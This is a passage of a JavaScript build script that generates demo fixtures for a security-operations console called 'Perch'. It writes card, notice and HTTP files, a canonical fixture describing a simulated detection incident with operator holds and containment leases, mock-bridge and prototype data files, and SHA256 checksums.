  "card-08-hold-a-terminal-executed": holdCard("hold-a-terminal", IDS.hold_a, IDS.ev_finding_spt_1, HOLD_A_TERMINAL, T.hold_a_terminal_ms),
  "card-09-receipt-hunt-evt-1": receiptCard(),
  "card-10-lease-host-ops-1": leaseCard(),
  "card-11-rollback-host-ops-1": rollbackCard(),
  // The `contested` variant (section 12.1). Not part of the base arc: a surface
  // seeded with the base fixture never receives these three.
  "variant-contested-01-verdict-op2-wins": CONTESTED_OP2_WINS,
  "variant-contested-02-verdict-op1-sending": CONTESTED_OP1_LOSES,
  "variant-contested-03-verdict-op1-superseded": CONTESTED_OP1_SUPERSEDED,
};

const NOTICES = {
  "event-46010-hold-a": holdNotice(IDS.hold_a, ACTION_A, T.hold_a_ms, IDS.ev_hold_a_open),
  "event-46010-hold-b": holdNotice(IDS.hold_b, ACTION_B, T.hold_b_ms, IDS.ev_hold_b_open),
  "variant-contested-event-46010-hold-b-two-principals": CONTESTED_NOTICE,
};

const j = (o) => JSON.stringify(o, null, 2) + "\n";
mkdirSync(join(HERE, "wire"), { recursive: true });
mkdirSync(join(HERE, "http"), { recursive: true });

for (const [name, body] of Object.entries(CARDS)) writeFileSync(join(HERE, "wire", name + ".json"), j(body));
for (const [name, body] of Object.entries(NOTICES)) writeFileSync(join(HERE, "wire", name + ".json"), j(body));
for (const [name, body] of Object.entries(FRAMES)) writeFileSync(join(HERE, "wire", name + ".json"), j(body));
for (const [name, body] of Object.entries(HTTP)) writeFileSync(join(HERE, "http", name), j(body));

// ── the one canonical fixture file everything else derives from ────────────
const FIXTURE = {
  schema: "swarm.perch.demo-fixture.v1",
  name: "hellcat-office",
  generated_by: "fixtures/build.mjs",
  based_on: "scenarios/office-dropper-correlation.yaml",
  clock: { shift_start_ms: SHIFT_START_MS, demo_now_ms: T.demo_now_ms, timestamps: T },
  constants: {
    policy: POLICY,
    deescalation_cooldown_secs: DEESCALATION_COOLDOWN_SECS,
    human_gate_severity: HUMAN_GATE_SEVERITY,
    capability_lease_ttl_ms: CAPABILITY_LEASE_TTL_MS,
    containment_lease_ttl_ms: CONTAINMENT_LEASE_TTL_MS,
    contingency_lease_ttl_ms: CONTINGENCY_LEASE_TTL_MS,
    max_actions_per_scope_per_minute: MAX_ACTIONS_PER_SCOPE_PER_MINUTE,
    perch_hold_ttl_ms: PERCH_HOLD_TTL_MS,
  },
  cast: {
    hosts: [{ id: "host-ops-1", note: "the one workstation both detectors land on" }],
    telemetry_subjects: [{ user: "alice", note: "ADVERSARY-SHAPED: comes from ProcessStartEvent.user and must render through <AdversaryString>" }],
    operator: {
      operator_id: OPERATOR_ID,
      token_env: "SWARM_OPERATOR_TOKEN",
      scopes: ["read", "rehearse", "approve", "maintenance"],
      nostr_pubkey: IDS.operator_nostr_pubkey,
      ed25519_voter_id: OPERATOR_VOTER_ID,
    },
    bridge: { nostr_pubkey: IDS.bridge_nostr_pubkey, spine_issuer: BRIDGE_ISSUER },
    daemon: { ingest_agent_id: DAEMON_AGENT_ID },
    detectors: ["suspicious_process_tree", "suspicious_scripting"],
  },
  channels: {
    lane_execution: { id: IDS.lane_execution_channel, name: "execution", type: "stream", visibility: "open" },
    case: { id: IDS.case_channel, name: "case-2026-03-17-host-ops-1", type: "stream", visibility: "private", ttl_seconds: 21600 },
    watch: { id: IDS.watch_channel, name: "watch", type: "stream", visibility: "open" },
  },
  deposits: DEPOSITS,
  concentration: CONC,
  // ── everything a surface needs that the incident alone does not carry ──
  // See the SURFACE DATA block above for the bright line between `story` and
  // `background`. A hold, a card, a receipt or a decision may only ever derive
  // from `story`.
  detector_threat_classes: DETECTOR_THREAT_CLASSES,
  lanes_with_no_detector: LANES_WITH_NO_DETECTOR,
  colony: COLONY,
  background: { hosts: BACKGROUND_HOSTS, deposits: BACKGROUND_DEPOSITS },
  // Every lane is measured at ONE instant, `demo_now_ms`. That is NOT the same
  // instant as `concentration.after_dismiss` (09:18:45Z, the tick right after
  // the suppression landed); 75 more seconds of decay separate them. A surface
  // that renders a lane value beside a concentration value must say which
  // instant each is from, or it has invented a disagreement.
  lanes_observed_at_seconds: NOW_S,
  lanes: LANES,
  findings: FINDINGS,
  queue: QUEUE,
  instrumentation: INSTRUMENTATION,
  crossing: {
    alert_threshold: POLICY.alert_threshold,
    min_sources_for_escalation: POLICY.min_sources_for_escalation,
    below: { ...CONC.below, exceeds: exceeds(CONC.below) },
    crossing: { ...CONC.crossing, exceeds: exceeds(CONC.crossing) },
    after_dismiss: { ...CONC.after_dismiss, exceeds: exceeds(CONC.after_dismiss) },
  },
  incident_id: `incident:hunt-evt-1:${T.incident_ms}`,
  holds: { a: HOLD_A_TERMINAL, b: HOLD_B_OPEN },
  capability_lease: CAPABILITY_LEASE,
  containment_lease_id: IDS.containment_lease,
  receipt_id: RECEIPT_ID,
  nostr_event_ids: {
    finding_spt_1: IDS.ev_finding_spt_1, finding_scr_1: IDS.ev_finding_scr_1,
    finding_spt_2: IDS.ev_finding_spt_2, escalation: IDS.ev_escalation,
    hold_a_open: IDS.ev_hold_a_open, hold_b_open: IDS.ev_hold_b_open,
    verdict_grant: IDS.ev_verdict_grant, verdict_dismiss: IDS.ev_verdict_dismiss,
    hold_a_terminal: IDS.ev_hold_a_terminal, receipt: IDS.ev_receipt,
    lease: IDS.ev_lease, rollback: IDS.ev_rollback,
    notice_46010_a: IDS.ev_46010_a, notice_46010_b: IDS.ev_46010_b,
  },

  // ── the `contested` variant, quarantined behind its own key ────────────
  variants: {
    contested: {
      note: "TWO Approve-scoped principals, one hold (hold B), one winner. The ONLY place this fixture admits a second operator. Nothing in `story` references it.",
      operators: [
        { operator_id: OPERATOR_ID, nostr_pubkey: IDS.operator_nostr_pubkey, ed25519_voter_id: OPERATOR_VOTER_ID, outcome: "lost the compare-and-set" },
        { operator_id: "perch-operator-2", nostr_pubkey: IDS.operator2_nostr_pubkey, ed25519_voter_id: `swarm:ed25519:${IDS.operator2_ed25519_pubkey}`, outcome: "recorded the decision" },
      ],
      hold_id: IDS.hold_b,
      decided_at_ms: CONTESTED_DECIDE_MS,
      winning_nostr_intent_event_id: IDS.ev_verdict_grant_op2,
      losing_nostr_intent_event_id: IDS.ev_verdict_grant_op1_contested,
      superseded_card_event_id: IDS.ev_verdict_superseded_op1,
      nostr_event_ids: {
        verdict_grant_op2: IDS.ev_verdict_grant_op2,
        verdict_grant_op1: IDS.ev_verdict_grant_op1_contested,
        verdict_superseded_op1: IDS.ev_verdict_superseded_op1,
      },
      files: {
        winner_card: "wire/variant-contested-01-verdict-op2-wins.json",
        loser_card: "wire/variant-contested-02-verdict-op1-sending.json",
        superseded_card: "wire/variant-contested-03-verdict-op1-superseded.json",
        two_principal_notice: "wire/variant-contested-event-46010-hold-b-two-principals.json",
        conflict_body: "http/variant-contested-POST-v1-response-holds-hold-b-decide-409.json",
      },
      // The reconciliation rule a console must implement, stated once so two
      // producers do not implement it twice and differently.
      reconciliation_rule: "A kind:9 swarm:verdict:v1 card whose hold_id matches a hold the daemon reports as decided, but whose Nostr event id is NOT the decision record's nostr_intent_event_id, renders as a human intent record that did not become the decision — never as the decision. The losing console publishes the `superseded` update card; a reader that never sees that card still reaches the same rendering from GET /v1/response/holds alone.",
    },
  },

  // ── the delegated Tauri mock's command table (14 §7.4.1 clause 4) ───────
  // This file is the ONE fixture corpus. It is vendored to
  // desktop/src/testing/perch/perchDemoFixture.json and imported by
  // src/testing/perch/e2ePerchBridge.ts, which e2eBridge.ts reaches through the
  // three-line `if (command.startsWith("perch_"))` guard before its `default:`
  // throw. Keys are the eleven read/write command names from
  // build/skeleton/desktop/src/shared/api/tauriPerch.ts; values are the same
  // bodies under http/, so the delegated mock and a page.route() interception
  // cannot disagree.
  //
  // `perch_decide_hold` and the other four daemon writes are DELIBERATELY
  // ABSENT from this table. A test that needs leg 2 answers it with
  // page.route(), because leg 2 crossing a process boundary is the product's
  // central claim and a harness that serves it from the same module the console
  // runs in has quietly deleted the thing under test.
  mock_bridge: {
    vendored_as: "desktop/src/testing/perch/perchDemoFixture.json",
    delegated_module: "desktop/src/testing/perch/e2ePerchBridge.ts",
    upstream_edit: "desktop/src/testing/e2eBridge.ts — three lines, the perch_ prefix guard before default:",
    perch_read_commands: {
      perch_list_holds: HTTP["GET-v1-response-holds.json"],
      perch_get_hold: { [IDS.hold_a]: { schema_version: 1, observed_at_ms: T.demo_now_ms, hold: heldActionView(HOLD_A_TERMINAL, T.demo_now_ms) }, [IDS.hold_b]: HTTP["GET-v1-response-holds-hold-b.json"] },
      perch_reviewed_findings: HTTP["GET-v1-operator-findings-reviewed.json"],
      perch_deposits: { execution: HTTP["GET-v1-operator-pheromone-deposits-execution.json"] },
      perch_list_containments: HTTP["GET-v1-operator-containment-leases.json"],
      // An absence with a reason, never a bare null. The delegated module throws
      // this string rather than returning null, so a spec that reaches an
      // unmocked command fails with the reason instead of a TypeError three
      // frames later.
      perch_operator_status: { __absent: "GET /v1/operator/status is swarmctl serve's route on :7766, a different process with a different incident store. Perch's equivalent read is not in this fixture; 20-TASK-BREAKDOWN.md T11 points the tuning report at GET /v2/api/runtime/status on the daemon instead." },
      perch_verify_artifact: { __absent: "no daemon route returns an artifact by id. INV-RF2's verified consequence is that swarm:finding:v1, swarm:receipt:v1 and swarm:escalation:v1 have NO daemon re-read at all, so those three cards must render the absence rather than a verification affordance." },
    },
    perch_daemon_write_commands_are_not_mocked_here: [
      "perch_decide_hold", "perch_finding_feedback", "perch_mint_incident",
      "perch_release_containment", "perch_create_review_session",
    ],
    perch_relay_write_commands_are_not_mocked_here: ["perch_record_verdict"],
    page_route_bodies: {
      "POST /v1/response/holds/{hold_id}/decide": "http/POST-v1-response-holds-hold-a-decide.json",
      "POST /v1/operator/findings/{finding_id}/feedback": "http/POST-v1-operator-findings-feedback-dismiss.json",
      "POST /v1/operator/incidents": "http/POST-v1-operator-incidents.json",
    },
  },
};
writeFileSync(join(HERE, "perch-demo-fixture.json"), j(FIXTURE));

// ── the TypeScript face of the same data, for the mock-bridge seed ────────
// Emitted rather than hand-written so a fixture edit cannot drift between the
// JSON the prototypes load and the object the Playwright seed pushes.
mkdirSync(join(HERE, "mock-bridge"), { recursive: true });
const tsBody = [
  "// GENERATED by fixtures/build.mjs. Do not edit by hand.",
  "// Source of truth: fixtures/perch-demo-fixture.json and fixtures/wire/*.json.",
  "//",
  "// This file is DATA ONLY. The seeding functions live in ./perchFixture.ts,",
  "// which touches the Buzz mock bridge exclusively through the window seams it",
  "// already exposes (desktop/src/testing/e2eBridge.ts:11238 push-feed-item,",
  "// :14597 invoke-mock-command, and the __BUZZ_E2E_EMIT_MOCK_MESSAGE__ /",
  "// __BUZZ_E2E_HAS_MOCK_LIVE_SUBSCRIPTION__ hooks declared at :1210 and :1202).",
  "// Nothing here requires an edit to e2eBridge.ts, which is 14,620 lines and",
  "// which 00-BRIEF.md and 09 both forbid splitting.",
  "",
  "export const PERCH_DEMO_FIXTURE = " + JSON.stringify(FIXTURE, null, 2) + " as const;",
  "",
  "export const PERCH_DEMO_CARDS = " + JSON.stringify(
    Object.fromEntries(Object.entries(CARDS).map(([k, v]) => [k, v])), null, 2) + " as const;",
  "",
  "export const PERCH_DEMO_NOTICES = " + JSON.stringify(NOTICES, null, 2) + " as const;",
  "",
  "export const PERCH_DEMO_FRAMES = " + JSON.stringify(FRAMES, null, 2) + " as const;",
  "",
].join("\n");
writeFileSync(join(HERE, "mock-bridge", "perchFixtureData.ts"), tsBody);

// ── the browser face of the same data, for the self-contained prototypes ──
// build/prototypes/*.html open from a file:// URL, where fetch() of a sibling
// file is blocked by the same-origin policy in every browser and a classic
// <script src> to a sibling is blocked in Chrome. So this emits a plain
// assignment a prototype can either (a) load with <script src> when served over
// http, or (b) paste between its own two sentinel comments. Two lines of
// integration, one source of truth, and `node build.mjs` re-emits it, so a
// prototype's fixture cannot drift from the wire files by hand-editing.
//
//   <!-- perch-fixture:begin -->
//   <script> ...contents of prototype/perch-fixture.js... </script>
//   <!-- perch-fixture:end -->
//
// The five wave-2 prototypes each declared their own cast for this case — five
// channel UUIDs, six hold-id grammars, five different total_strengths for the
// same incident. This file is what they bind to instead. `window.PERCH_FIXTURE`
// is the whole canonical object; `window.PERCH_CARDS` / `PERCH_NOTICES` /
// `PERCH_FRAMES` are the wire bodies, so a drawing of a card can render the same
// bytes a decoder will see.
mkdirSync(join(HERE, "prototype"), { recursive: true });
const protoHeader = [
  "// GENERATED by fixtures/build.mjs. Do not edit by hand.",
  "// Canonical source: fixtures/perch-demo-fixture.json + fixtures/wire/*.json.",
  "// Regenerate with `node fixtures/build.mjs`; verify with `node fixtures/validate.mjs`.",
];
// TWO files, because a drawing pays for what it pastes. The cast, the clock, the
// twelve lanes, the four queues, the colony and both holds are ~38 KB; the raw
// wire bodies are another ~34 KB and only a page that renders a card's actual
// JSON needs them. A prototype is already 110-130 KB before it loads either.
writeFileSync(join(HERE, "prototype", "perch-fixture.js"), [
  ...protoHeader,
  "// The cast, the clock, the arithmetic, the lanes, the queues, the colony,",
  "// the instrumentation strip, both holds and the contested variant's ids.",
  "// This is what a drawing binds to instead of declaring a local FIXTURE.",
  "globalThis.PERCH_FIXTURE = " + JSON.stringify(FIXTURE) + ";",
  "",
].join("\n"));
writeFileSync(join(HERE, "prototype", "perch-fixture-wire.js"), [
  ...protoHeader,
  "// The raw wire bodies. Load this ONLY on a page that renders a card's actual",
  "// JSON (a provenance block, a Ledger detail pane, a canonical-bytes diff).",
  "// Every envelope_hash here is real and recomputable -- and still tier 0,",
  "// because nothing carries a signature. See 22-DEMO-FIXTURE.md section 9.",
  "globalThis.PERCH_CARDS = " + JSON.stringify(CARDS) + ";",
  "globalThis.PERCH_NOTICES = " + JSON.stringify(NOTICES) + ";",
  "globalThis.PERCH_FRAMES = " + JSON.stringify(FRAMES) + ";",
  "",
].join("\n"));

// ── SHA256SUMS over everything this script wrote ───────────────────────────
const files = [];
for (const dir of ["wire", "http"]) {
  for (const f of readdirSync(join(HERE, dir)).sort()) files.push(`${dir}/${f}`);
}
files.push("perch-demo-fixture.json");
files.push("mock-bridge/perchFixtureData.ts");
files.push("prototype/perch-fixture.js");
files.push("prototype/perch-fixture-wire.js");
const sums = files.map((f) => `${createHash("sha256").update(readFileSync(join(HERE, f))).digest("hex")}  ${f}`).join("\n") + "\n";
writeFileSync(join(HERE, "SHA256SUMS"), sums);

console.log(`wrote ${files.length} fixture files + SHA256SUMS`);
console.log("crossing:", JSON.stringify(FIXTURE.crossing, null, 2));
